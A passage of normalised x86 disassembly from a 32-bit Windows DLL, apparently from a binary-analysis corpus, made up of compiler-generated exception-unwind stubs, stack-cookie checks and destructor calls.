pop ecx
pop ecx
retn
sub_1004cd27
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004cd42
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004cd5d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004cd78
lea ecx [ ebp - 0x30 ]
jmp sub_1000206b
sub_1004cd80
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x2c ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_100242d7
add eax 0x4
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004cda8
lea ecx [ ebp - 0x30 ]
jmp sub_1000206b
sub_1004cdb0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x5c ]
xor ecx eax
call sub_100242d7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004cdd5
lea ecx [ ebp - 0x2c ]
jmp sub_1000206b
sub_1004cddd
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x68 ]
xor ecx eax
call sub_100242d7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004ce02
lea ecx [ ebp - 0x30 ]
jmp sub_1000206b
sub_1004ce0a
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x64 ]
mov ecx [ edx - 0x68 ]
xor ecx eax
call sub_100242d7
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004ce32
mov ecx [ ebp - 0x10 ]
jmp sub_1000ca57
sub_1004ce3a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004ce55
mov ecx [ ebp - 0x10 ]
sub ecx 0x50
jmp sub_1000cafb
sub_1004ce60
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004ce7b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004ce96
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004ceb1
mov ecx [ ebp - 0x10 ]
jmp sub_100244cc
sub_1004ceb9
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004ced4
lea eax [ ebp - 0x20 ]
jmp sub_1000d7e7
sub_1004cedc
lea eax [ ebp - 0x18 ]
jmp sub_1000d7e7
sub_1004cee4
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp + 0xc ]
jmp sub_10012639
sub_1004cefd
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004cf18
mov ecx [ ebp + 0x8 ]
jmp sub_1001298a
sub_1004cf20
mov ecx [ ebp + 0x8 ]
add ecx 0x4
jmp sub_1000206b
sub_1004cf2b
mov ecx [ ebp + 0x8 ]
add ecx 0x20
jmp sub_10012639
sub_1004cf36
mov ecx [ ebp + 0x8 ]
add ecx 0x3c
jmp sub_10012639
sub_1004cf41
mov ecx [ ebp + 0x8 ]
add ecx 0x58
jmp sub_10012639
sub_1004cf4c
mov ecx [ ebp + 0x8 ]
add ecx 0x74
jmp sub_10012639
sub_1004cf57
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004cf72
lea ecx [ ebp - 0x2c ]
jmp sub_10012639
sub_1004cf7a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004cf95
mov ecx [ ebp - 0x10 ]
sub ecx 0x50
jmp sub_1000cab6
sub_1004cfa0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004cfbb
mov ecx [ ebp - 0x10 ]
jmp sub_1000ed79
sub_1004cfc3
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004cfde
lea ecx [ ebp - 0x2c ]
jmp sub_1000206b
sub_1004cfe6
lea ecx [ ebp - 0x2c ]
jmp sub_1000206b
sub_1004cfee
lea ecx [ ebp - 0x48 ]
jmp sub_1000206b
sub_1004cff6
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x50 ]
xor ecx eax
call sub_100242d7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004d01b
lea ecx [ ebp - 0x30 ]
jmp sub_10012639
sub_1004d023
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x3c ]
xor ecx eax
call sub_100242d7
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004d048
lea ecx [ ebp - 0x2c ]
jmp sub_10012639
sub_1004d050
lea ecx [ ebp - 0x2c ]
jmp sub_10012639
sub_1004d058
lea ecx [ ebp - 0x48 ]
jmp sub_10012639
sub_1004d060
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x50 ]
xor ecx eax
call sub_100242d7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004d085
mov eax [ ebp + 0x8 ]
jmp sub_10001447
sub_1004d08d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004d0a8
mov eax [ ebp + 0x8 ]
jmp sub_10001435
sub_1004d0b0
mov ecx [ ebp + 0x8 ]
add ecx 0x18
jmp sub_10012639
sub_1004d0bb
mov ecx [ ebp + 0x8 ]
add ecx 0x38
jmp sub_10012639
sub_1004d0c6
mov ecx [ ebp + 0x8 ]
add ecx 0x54
jmp sub_10012639
sub_1004d0d1
mov eax [ ebp + 0x8 ]
add eax 0x70
jmp sub_10001435
sub_1004d0dc
mov ecx [ ebp + 0x8 ]
add ecx 0x88
jmp sub_10012639
sub_1004d0ea
mov ecx [ ebp + 0x8 ]
add ecx 0xa4
jmp sub_10012639
sub_1004d0f8
mov ecx [ ebp + 0x8 ]
add ecx 0xc0
jmp sub_10012639
sub_1004d106
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004d121
lea ecx [ ebp - 0x30 ]
jmp sub_1000206b
sub_1004d129
lea ecx [ ebp - 0x54 ]
jmp sub_1000206b
sub_1004d131
lea ecx [ ebp - 0x54 ]
jmp sub_1000206b
sub_1004d139
lea ecx [ ebp - 0x54 ]
jmp sub_1000206b
sub_1004d141
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x80 ]
xor ecx eax
call sub_100242d7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004d166
lea ecx [ ebp - 0x2c ]
jmp sub_1000206b
sub_1004d16e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x58 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004d189
lea ecx [ ebp - 0x28 ]
jmp sub_1000206b
sub_1004d191
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x54 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004d1ac
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x278 ]
xor ecx eax
call sub_100242d7
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004d1d4
lea ecx [ ebp - 0x2a8 ]
jmp sub_1000206b
sub_1004d1df
lea ecx [ ebp - 0x2a8 ]
jmp sub_1000206b
sub_1004d1ea
lea ecx [ ebp - 0x2a8 ]
jmp sub_1000206b
sub_1004d1f5
lea ecx [ ebp - 0x264 ]
jmp sub_1000206b
sub_1004d200
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x2a4 ]
mov ecx [ edx - 0x2a8 ]
xor ecx eax
call sub_100242d7
add eax 0x4
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004d22e
lea ecx [ ebp - 0x2c ]
jmp sub_1000206b
sub_1004d236
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004d251
mov eax [ ebp - 0x18 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x18 ] 0xfffffffe
mov ecx [ ebp - 0x14 ]
jmp sub_1000206b
sub_1004d26a
lea ecx [ ebp - 0x34 ]
jmp sub_1000206b
sub_1004d272
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x38 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004d28d
lea ecx [ ebp - 0x5c ]
jmp sub_1000206b
sub_1004d295
jmp CoUninitialize
sub_1004d29a
lea ecx [ ebp - 0x40 ]
jmp sub_1000206b
sub_1004d2a2
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xb0 ]
xor ecx eax
call sub_100242d7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004d2ca
mov ecx [ ebp + 0x8 ]
add ecx 0x4
jmp sub_10022f39
sub_1004d2d5
mov ecx [ ebp + 0x8 ]
add ecx 0xc
jmp sub_10022f39
sub_1004d2e0
lea ecx [ ebp - 0x2c ]
jmp sub_1000206b
sub_1004d2e8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x58 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004d303
push [ ebp - 0x18 ]
call sub_100242e6
pop ecx
retn
sub_1004d30d
lea eax [ ebp - 0x20 ]
jmp sub_1000d7e7
sub_1004d315
lea esi [ ebp - 0x48 ]
jmp sub_10015514
sub_1004d31d
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
mov esi [ ebp + 0x8 ]
jmp sub_10015514
sub_1004d336
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x4c ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004d351
mov ecx [ ebp + 0x8 ]
jmp sub_10022f39
sub_1004d359
lea ecx [ ebp - 0x2c ]
jmp sub_1000206b
sub_1004d361
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x58 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004d37c
lea ecx [ ebp - 0x2c ]
jmp sub_1000206b
sub_1004d384
lea ecx [ ebp - 0x2c ]
jmp sub_1000206b
sub_1004d38c
lea ecx [ ebp - 0x2c ]
jmp sub_1000206b
sub_1004d394
lea ecx [ ebp - 0x48 ]
jmp sub_1000206b
sub_1004d39c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x74 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004d3b7
lea ecx [ ebp - 0x34 ]
jmp sub_10012639
sub_1004d3bf
lea ecx [ ebp - 0x50 ]
jmp sub_10012639
sub_1004d3c7
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8c ]
xor ecx eax
call sub_100242d7
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004d3ef
mov eax [ ebp - 0x1c ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x1c ] 0xfffffffe
mov ecx [ ebp - 0x18 ]
jmp sub_10012639
sub_1004d408
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x28 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004d423
mov ecx [ ebp + 0x8 ]
jmp sub_1001298a
sub_1004d42b
mov ecx [ ebp + 0x8 ]
add ecx 0x4
jmp sub_1000206b
sub_1004d436
mov ecx [ ebp + 0x8 ]
add ecx 0x20
jmp sub_10012639
sub_1004d441
mov ecx [ ebp + 0x8 ]
add ecx 0x3c
jmp sub_10012639
sub_1004d44c
mov ecx [ ebp + 0x8 ]
add ecx 0x58
jmp sub_10012639
sub_1004d457
mov eax [ ebp + 0x8 ]
add eax 0x74
jmp sub_10001435
sub_1004d462
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004d47d
lea ecx [ ebp - 0x54 ]
jmp sub_1000206b
sub_1004d485
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x54 ]
mov ecx [ edx - 0x58 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004d4a0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004d4bb
lea eax [ ebp - 0x24 ]
jmp sub_1000d7e7
sub_1004d4c3
lea eax [ ebp - 0x24 ]
jmp sub_1000d7e7
sub_1004d4cb
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x28 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004d4e6
lea ecx [ ebp + 0xc ]
jmp sub_10003c49
sub_1004d4ee
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004d509
mov esi [ ebp + 0x8 ]
jmp sub_1000eb13
sub_1004d511
mov ecx [ ebp + 0x8 ]
add ecx 0x3c
jmp sub_1000eb34
sub_1004d51c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004d537
mov esi [ ebp + 0x8 ]
jmp sub_1000e77e
sub_1004d53f
mov ecx [ ebp + 0x8 ]
add ecx 0x3c
jmp sub_1000eb34
sub_1004d54a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004d565
mov esi [ ebp + 0x8 ]
jmp sub_1000e4cd
sub_1004d56d
mov ecx [ ebp + 0x8 ]
add ecx 0x3c
jmp sub_1000eb34
sub_1004d578
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004d593
lea ecx [ ebp - 0x2c ]
jmp sub_1000206b
sub_1004d59b
lea ecx [ ebp - 0x48 ]
jmp sub_1000206b
sub_1004d5a3
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x6c ]
xor ecx eax
call sub_100242d7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004d5c8
lea ecx [ ebp - 0x48 ]
jmp sub_1000206b
sub_1004d5d0
lea ecx [ ebp - 0x2c ]
jmp sub_1000206b
sub_1004d5d8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x68 ]
xor ecx eax
call sub_100242d7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004d5fd
lea ecx [ ebp - 0x3c ]
jmp sub_10003c49
sub_1004d605
lea ecx [ ebp - 0x30 ]
jmp sub_1000206b
sub_1004d60d
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x4c ]
mov ecx [ edx - 0x50 ]
xor ecx eax
call sub_100242d7
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004d635
lea ecx [ ebp - 0x50 ]
jmp sub_10003c49
sub_1004d63d
lea ecx [ ebp - 0x30 ]
jmp sub_1000206b
sub_1004d645
lea ecx [ ebp - 0x4c ]
jmp sub_1000206b
sub_1004d64d
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x7c ]
mov ecx [ edx - 0x80 ]
xor ecx eax
call sub_100242d7
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004d675
lea ecx [ ebp - 0x38 ]
jmp sub_10003c49
sub_1004d67d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x4c ]
xor ecx eax
call sub_100242d7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004d6a2
lea ecx [ ebp - 0x54 ]
jmp sub_10003c49
sub_1004d6aa
lea ecx [ ebp - 0x4c ]
jmp sub_1000206b
sub_1004d6b2
lea ecx [ ebp - 0x2c ]
jmp sub_1000206b
sub_1004d6ba
lea ecx [ ebp - 0x2c ]
jmp sub_1000206b
sub_1004d6c2
lea ecx [ ebp - 0x60 ]
jmp sub_10003c49
sub_1004d6ca
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x70 ]
xor ecx eax
call sub_100242d7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004d6ef
lea ecx [ ebp - 0x3c ]
jmp sub_10003c49
sub_1004d6f7
lea ecx [ ebp - 0x2c ]
jmp sub_1000206b
sub_1004d6ff
lea ecx [ ebp - 0x5c ]
jmp sub_1000206b
sub_1004d707
lea ecx [ ebp - 0x5c ]
jmp sub_1000206b
sub_1004d70f
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x60 ]
xor ecx eax
call sub_100242d7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004d734
mov ecx [ ebp + 0x8 ]
add ecx 0x4
jmp sub_1000206b
sub_1004d73f
lea ecx [ ebp - 0x28 ]
jmp sub_1000206b
sub_1004d747
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x54 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004d762
lea ecx [ ebp - 0x3c ]
jmp sub_1000206b
sub_1004d76a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x68 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004d785
lea ecx [ ebp - 0x30 ]
jmp sub_1000206b
sub_1004d78d
lea ecx [ ebp - 0x54 ]
jmp sub_1000206b
sub_1004d795
lea ecx [ ebp - 0x54 ]
jmp sub_1000206b
sub_1004d79d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x80 ]
xor ecx eax
call sub_100242d7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004d7c2
push [ ebp - 0x14 ]
call sub_100242e6
pop ecx
retn
sub_1004d7cc
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
lea ecx [ ebp - 0x30 ]
jmp sub_1000206b
sub_1004d7e5
mov eax [ ebp - 0x10 ]
and eax 0x2
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa4 ]
jmp sub_1000384f
sub_1004d801
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xa8 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004d81f
push [ ebp + 0x8 ]
call sub_100242e6
pop ecx
retn
sub_1004d829
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
lea ecx [ ebp - 0x2c ]
jmp sub_1000206b
sub_1004d842
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xa4 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004d860
lea ecx [ ebp - 0x34 ]
jmp sub_10003c49
sub_1004d868
lea ecx [ ebp - 0x30 ]
jmp sub_1000206b
sub_1004d870
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x54 ]
mov ecx [ edx - 0x58 ]
xor ecx eax
call sub_100242d7
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004d898
lea ecx [ ebp - 0x54 ]
jmp sub_10003c49
sub_1004d8a0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x64 ]
xor ecx eax
call sub_100242d7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004d8c5
lea ecx [ ebp - 0x58 ]
jmp sub_10003c49
sub_1004d8cd
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x60 ]
xor ecx eax
call sub_100242d7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004d8f2
lea ecx [ ebp - 0x38 ]
jmp sub_10003c49
sub_1004d8fa
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x48 ]
xor ecx eax
call sub_100242d7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004d91f
lea ecx [ ebp - 0x3c ]
jmp sub_10003c49
sub_1004d927
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x48 ]
xor ecx eax
call sub_100242d7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004d94c
lea ecx [ ebp - 0x54 ]
jmp sub_10003c49
sub_1004d954
lea ecx [ ebp - 0x4c ]
jmp sub_10012639
sub_1004d95c
lea ecx [ ebp - 0x2c ]
jmp sub_10012639
sub_1004d964
lea ecx [ ebp - 0x2c ]
jmp sub_10012639
sub_1004d96c
lea ecx [ ebp - 0x60 ]
jmp sub_10003c49
sub_1004d974
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x70 ]
xor ecx eax
call sub_100242d7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004d999
lea ecx [ ebp - 0x3c ]
jmp sub_10003c49
sub_1004d9a1
lea ecx [ ebp - 0x2c ]
jmp sub_10012639
sub_1004d9a9
lea ecx [ ebp - 0x5c ]
jmp sub_10012639
sub_1004d9b1
lea ecx [ ebp - 0x5c ]
jmp sub_10012639
sub_1004d9b9
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x60 ]
xor ecx eax
call sub_100242d7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004d9de
lea ecx [ ebp - 0x30 ]
jmp sub_10012639
sub_1004d9e6
lea ecx [ ebp - 0x4c ]
jmp sub_10012639
sub_1004d9ee
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x64 ]
xor ecx eax
call sub_100242d7
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004da13
mov eax [ ebp + 0x8 ]
jmp sub_10001435
sub_1004da1b
mov ecx [ ebp + 0x8 ]
add ecx 0x18
jmp sub_10012639
sub_1004da26
mov ecx [ ebp + 0x8 ]
add ecx 0x38
jmp sub_10012639
sub_1004da31
mov ecx [ ebp + 0x8 ]
add ecx 0x54
jmp sub_10012639
sub_1004da3c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004da57
lea ecx [ ebp - 0x34 ]
jmp sub_10003c49
sub_1004da5f
lea ecx [ ebp - 0x2c ]
jmp sub_1000206b
sub_1004da67
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x40 ]
xor ecx eax
call sub_100242d7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004da8c
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp - 0x14 ]
jmp sub_1000206b
sub_1004daa5
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004dac0
lea ecx [ ebp - 0x48 ]
jmp sub_1000206b
sub_1004dac8
lea ecx [ ebp - 0x2c ]
jmp sub_1000206b
sub_1004dad0
lea ecx [ ebp - 0xdc ]
jmp sub_1000206b
sub_1004dadb
lea ecx [ ebp - 0xa4 ]
jmp sub_1000206b
sub_1004dae6
lea ecx [ ebp - 0x88 ]
jmp sub_1000206b
sub_1004daf1
lea ecx [ ebp - 0xc0 ]
jmp sub_1000206b
sub_1004dafc
lea ecx [ ebp - 0x6c ]
jmp sub_1000206b
sub_1004db04
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xe4 ]
xor ecx eax
call sub_100242d7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004db2c
lea ecx [ ebp - 0x2c ]
jmp sub_1000206b
sub_1004db34
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x5c ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004db4f
lea eax [ ebp + 0x10 ]
jmp sub_1000d7e7
sub_1004db57
lea ecx [ ebp - 0x28 ]
jmp sub_1000206b
sub_1004db5f
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x5c ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004db7a
lea ecx [ ebp - 0x40 ]
jmp sub_1000206b
sub_1004db82
push [ ebp - 0x24 ]
call sub_100242e6
pop ecx
retn
sub_1004db8c
lea eax [ ebp - 0x1c ]
jmp sub_1000d7e7
sub_1004db94
lea ecx [ ebp - 0x40 ]
jmp sub_1000206b
sub_1004db9c
lea esi [ ebp - 0x94 ]
jmp sub_10015514
sub_1004dba7
mov eax [ ebp - 0x20 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x20 ] 0xfffffffe
mov esi [ ebp + 0xc ]
jmp sub_10015514
sub_1004dbc0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x98 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004dbde
mov ecx [ ebp + 0x8 ]
add ecx 0xc
jmp sub_10012639
sub_1004dbe9
lea ecx [ ebp - 0x30 ]
jmp sub_1000206b
sub_1004dbf1
lea ecx [ ebp - 0x30 ]
jmp sub_1000206b
sub_1004dbf9
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x60 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004dc14
mov eax [ ebp - 0x40 ]
and eax 0x1
je r-xdata
